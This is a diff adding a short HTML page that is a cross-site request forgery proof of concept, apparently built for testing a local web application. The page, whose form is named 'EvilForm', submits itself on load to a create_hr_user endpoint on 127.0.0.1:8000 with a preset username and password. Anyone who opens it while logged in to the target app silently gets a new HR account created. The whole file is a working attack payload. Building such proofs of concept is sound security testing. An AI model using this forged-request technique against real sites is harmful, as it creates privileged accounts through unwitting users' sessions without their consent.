@@ -1,0 +1,17 @@
+<html>
+	<body onload='document.EvilForm.submit()'>
+
+    <form action="http://127.0.0.1:8000/create_hr_user/" method="post" name='EvilForm'>
+        <h2>Create a new HR account </h2>
+
+      <table>
+        <tr><th><label for="id_first_name">First name:</label></th><td><input id="id_first_name" maxlength="100" name="username" type="text" value="Lily" required /></td></tr>
+        <tr><th><label for="id_password">Last name:</label></th><td><input id="id_password" maxlength="100" name="password" type="password" value="Lily34567" required /></td></tr>
+        <tr><th><label for="id_password_retype">Last name:</label></th><td><input id="id_password_retype" maxlength="100" name="password_retype" type="password" value="Lily34567" required /></td></tr>
+
+      </table>
+      <input type="submit" value="Submit" />
+    </form>
+
+</body>
+</html>
